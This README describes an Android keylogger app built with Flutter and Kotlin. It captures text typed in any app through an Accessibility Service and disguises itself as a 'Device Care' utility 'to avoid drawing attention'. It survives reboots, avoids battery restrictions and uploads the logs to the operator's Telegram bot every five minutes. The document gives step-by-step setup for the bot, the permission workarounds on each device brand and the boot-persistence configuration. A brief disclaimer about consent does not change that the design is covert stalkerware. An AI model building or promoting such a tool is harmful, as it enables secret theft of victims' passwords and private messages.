# Flutter Phone Event Logger

A private security application built with Flutter and Android Native (Kotlin) that monitors and logs system-wide keystrokes using Android's Accessibility Service. The app runs persistently in the background — even when completely closed or after a device reboot — and automatically delivers logs to a configured Telegram bot.

The UI is disguised as **Device Care**, a system utility app, to avoid drawing attention.

---

## 📋 Table of Contents

- [How It Works](#-how-it-works)
- [Architecture Overview](#-architecture-overview)
- [Features](#-features)
- [Telegram Bot Setup](#-telegram-bot-setup)
- [Environment Configuration](#-environment-configuration)
- [Android Permissions & Setup](#-android-permissions--setup)
- [Boot Survival (Auto-Start After Reboot)](#-boot-survival-auto-start-after-reboot)
- [Battery Optimization](#-battery-optimization)
- [File Structure](#-file-structure)
- [Tech Stack](#-tech-stack)
- [Security Warning](#-security-warning)

---

## 🚀 How It Works

This app uses a multi-layer architecture to capture events that happen outside of the Flutter application and survive complete app termination and device reboots.

### Layer 1 — Android Native (Kotlin): The Event Engine

Since Flutter is sandboxed and cannot observe other apps, the core monitoring is done natively:

- **`MyAccessibilityService`** is registered with the Android OS to listen for `TYPE_VIEW_TEXT_CHANGED` events system-wide.
- Once the user grants Accessibility permission, Android delivers a callback to the Kotlin service every time text is modified in **any app** (browsers, messaging apps, etc.).
- The service writes timestamped log entries **directly to disk** (`filesDir/security_logs.txt`) without requiring the Flutter UI to be alive.
- Every 5 minutes, the service reads the log file and sends it to Telegram via its own HTTP client, then wipes the file — all independently of Flutter.

### Layer 2 — Communication Bridge (MethodChannel)

When the Flutter UI **is** alive, events are also pushed to it in real time:

- A `flutterCallback` lambda is registered by `MainActivity` when the UI starts.
- When a keystroke is captured, Kotlin calls `flutterCallback?.invoke(text)` — the `?` means if Flutter is dead, this is safely skipped.
- `MainActivity` nulls the callback in `onDestroy()` so there are never stale references.

### Layer 3 — Flutter UI (Dart & GetX)

- **`LoggerController`** manages the `MethodChannel`, reactive log list, and lifecycle observation.
- On startup and every time the app returns to the foreground, it reads the log file from disk to display everything captured while the UI was closed.
- Provides `isAccessibilityEnabled` status and a direct link to Accessibility Settings.

### Layer 4 — Boot Survival (BroadcastReceiver)

- **`BootReceiver`** listens for `BOOT_COMPLETED` and `QUICKBOOT_POWERON` broadcasts.
- On boot, it checks whether the user had previously granted Accessibility permission.
- If yes, it wakes the app process so the `MyAccessibilityService` can reconnect and resume capturing.

---

## 🏗 Architecture Overview

```
┌─────────────────────────────────────────────────────┐
│                  Android OS                         │
│   TYPE_VIEW_TEXT_CHANGED events (any app)           │
└─────────────────────┬───────────────────────────────┘
                      │
                      ▼
┌─────────────────────────────────────────────────────┐
│           MyAccessibilityService (Kotlin)           │
│                                                     │
│  ┌─────────────────┐    ┌────────────────────────┐  │
│  │  Write to disk  │    │  flutterCallback?.     │  │
│  │  filesDir/      │    │  invoke(text)          │  │
│  │  security_logs  │    │  (only if UI alive)    │  │
│  └────────┬────────┘    └──────────┬─────────────┘  │
│           │                        │                 │
│  ┌────────▼────────┐               │                 │
│  │ Send to Telegram│               │                 │
│  │ every 5 minutes │               │                 │
│  └─────────────────┘               │                 │
└───────────────────────────────┬────┼────────────────┘
                                │    │
                                │    ▼
                    ┌───────────┼──────────────────┐
                    │      MainActivity             │
                    │   MethodChannel bridge        │
                    └───────────┬──────────────────┘
                                │
                                ▼
                    ┌───────────────────────────┐
                    │   LoggerController (Dart) │
                    │   Reactive UI via GetX    │
                    └───────────────────────────┘

On Reboot:
BOOT_COMPLETED ──► BootReceiver ──► Check permission ──► Wake process ──► Service resumes
```

---

## ✨ Features

- ✅ System-wide keystroke capture via Accessibility Service
- ✅ Works when app is completely closed (service runs independently)
- ✅ Auto-starts after device reboot via `BootReceiver`
- ✅ Logs sent to Telegram every 5 minutes automatically
- ✅ Logs written to disk immediately — nothing is lost if the device restarts mid-session
- ✅ Flutter UI shows live events when open, and loads missed events from disk on resume
- ✅ Battery optimization exemption requested on first launch
- ✅ UI disguised as "Device Care" system utility app
- ✅ Accessibility service status indicator with one-tap enable shortcut

---

## 📱 Telegram Bot Setup

To receive logs on your phone or any Telegram account, you need to create a bot and get your credentials.

### Step A: Create your Bot and get the Token

1. Open Telegram and search for **@BotFather**, then tap **Start**.
2. Send the command `/newbot`.
3. Follow the prompts:
   - **Name**: Give it any display name (e.g., `My Security Bot`).
   - **Username**: Must be unique and end in `bot` (e.g., `my_private_logger_bot`).
4. BotFather will reply with an **HTTP API Token** that looks like:
   ```
   74839201:AAHk-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
   ```
   Copy this — it goes into `MyAccessibilityService.kt` as the `token` variable.

### Step B: Get your Chat ID

You cannot guess or make up a Chat ID. To find yours:

1. Search for **@userinfobot** on Telegram and tap **Start**.
2. It will immediately reply with your **Id** — a long integer like `8231933199`.
3. Copy this — it goes into `MyAccessibilityService.kt` as the `chatId` variable.

### Step C: Activate the Bot (Critical Step)

Your bot cannot message you until you message it first — this is a Telegram requirement.

1. Find your bot using the link BotFather gave you (e.g., `t.me/my_private_logger_bot`).
2. Tap **Start** in that chat.

The bot can now send you files. If you skip this step, all Telegram calls will silently fail with a 403 error.

### Step D: Put the credentials in the code

In `MyAccessibilityService.kt`, update these two lines inside `sendLogFileToTelegram()`:

```kotlin
val token = "YOUR_BOT_TOKEN_HERE"
val chatId = "YOUR_CHAT_ID_HERE"
```

---

## ⚙️ Environment Configuration

Currently the bot token and chat ID are hardcoded in `MyAccessibilityService.kt`. For better security, you can move them to a `.env` file using the `flutter_dotenv` package:

1. Add to `pubspec.yaml`:
   ```yaml
   dependencies:
     flutter_dotenv: ^5.1.0
   ```

2. Create `.env` in the project root:
   ```
   BOT_TOKEN=your_telegram_bot_token_here
   CHAT_ID=your_telegram_chat_id_here
   ```

3. Add `.env` to `pubspec.yaml` assets:
   ```yaml
   flutter:
     assets:
       - .env
   ```

4. Add `.env` to `.gitignore`:
   ```
   .env
   ```

> ⚠️ Never commit your bot token or chat ID to a public repository.

---

## 🔐 Android Permissions & Setup

Because this app monitors sensitive system input, Android's security model blocks it by default. You must manually grant Accessibility permission once after installation.

### On Realme / ColorOS / OPPO devices (Android 13+):

1. Install the app.
2. Open it once (this triggers the battery optimization dialog — tap **Allow**).
3. Go to **Settings → Apps → App Management → Device Care**.
4. Tap the **⋮ (three dots)** in the top right corner.
5. Select **"Allow restricted settings"**.
6. Now go to **Settings → Additional Settings → Accessibility**.
7. Find **Device Care** and toggle it **ON**.
8. Confirm the permission dialog.

### On Stock Android / Pixel devices:

1. Go to **Settings → Accessibility → Downloaded Apps**.
2. Find **Device Care** and toggle it **ON**.

### On Samsung devices:

1. Go to **Settings → Accessibility → Installed apps**.
2. Find **Device Care** and toggle it **ON**.

> After granting permission, you never need to do this again — it survives reboots and app updates.

---

## 🔄 Boot Survival (Auto-Start After Reboot)

The app automatically resumes after a reboot without any user action.

**How it works:**

1. Phone boots → Android fires the `BOOT_COMPLETED` broadcast.
2. `BootReceiver.onReceive()` is triggered.
3. It checks `Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES` to confirm the user had previously granted permission.
4. If permission exists → it launches `MainActivity` to wake the process.
5. `MyAccessibilityService` reconnects with Android and resumes capturing.

> **Important:** Android does not allow any app to programmatically enable an Accessibility Service — only the user can do this in Settings. However, once granted, Android remembers it across reboots. The `BootReceiver` simply wakes the process so the already-granted service can reconnect.

**Required manifest entries (already configured):**

```xml
<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />

<receiver
    android:name=".BootReceiver"
    android:enabled="true"
    android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.BOOT_COMPLETED" />
        <action android:name="android.intent.action.QUICKBOOT_POWERON" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
</receiver>
```

---

## 🔋 Battery Optimization

On first launch, the app automatically requests exemption from Android's battery optimization system. This is critical for background survival on OEM devices (Realme, Xiaomi, Samsung, etc.) that aggressively kill background processes.

The dialog appears once. If the user taps **Allow**, the app is whitelisted and Android will not kill the service.

If the system dialog does not appear (some OEMs block the intent), manually exempt the app:

1. Go to **Settings → Battery → Battery Optimization**.
2. Find **Device Care**.
3. Select **"Don't optimize"** or **"No restrictions"**.

On **Realme/ColorOS** specifically:
- **Settings → App Management → Device Care → Battery → Allow background activity → ON**

---

## 📁 File Structure

```
flutter-phone-event-logger/
│
├── android/app/src/main/
│   ├── kotlin/com/example/flutter_phone_events/
│   │   ├── MainActivity.kt              # Flutter entry + MethodChannel bridge
│   │   ├── MyAccessibilityService.kt    # Core keystroke capture + Telegram sender
│   │   └── BootReceiver.kt             # Auto-start after reboot
│   │
│   ├── res/
│   │   ├── xml/
│   │   │   └── accessibility_service_config.xml  # Event types config
│   │   └── values/
│   │       └── strings.xml             # App name, service label, description
│   │
│   └── AndroidManifest.xml
│
├── lib/
│   ├── main.dart                        # UI entry point (Device Care theme)
│   └── logger_controller.dart          # GetX controller, MethodChannel, file reading
│
└── pubspec.yaml
```

---

## 🛠 Tech Stack

| Layer | Technology |
|---|---|
| UI Framework | Flutter (Dart) |
| State Management | GetX |
| Native Layer | Kotlin (Android) |
| Background Service | Android AccessibilityService |
| Boot Persistence | BroadcastReceiver |
| Local Storage | filesDir (Kotlin) / path_provider (Dart) |
| Remote Delivery | Telegram Bot API (HTTP multipart) |
| HTTP Client | Native `HttpURLConnection` (no extra dependencies) |

---

## 🔒 Security Warning

This application is intended for **personal device monitoring and educational purposes only**.

- **Do not install** this app on any device without the owner's explicit knowledge and consent. Doing so may be illegal in your jurisdiction.
- **Do not share** the generated `security_logs.txt` file or your Telegram bot token.
- **Do not push** your bot token or chat ID to any public repository. Add `.env` to `.gitignore`.
- The logs are stored in `filesDir`, which is private to the app and inaccessible to other apps without root access.
- The Telegram bot token gives full control over your bot — treat it like a password.

---

## 📜 License

This project is for educational and personal security research use only. Use responsibly and legally.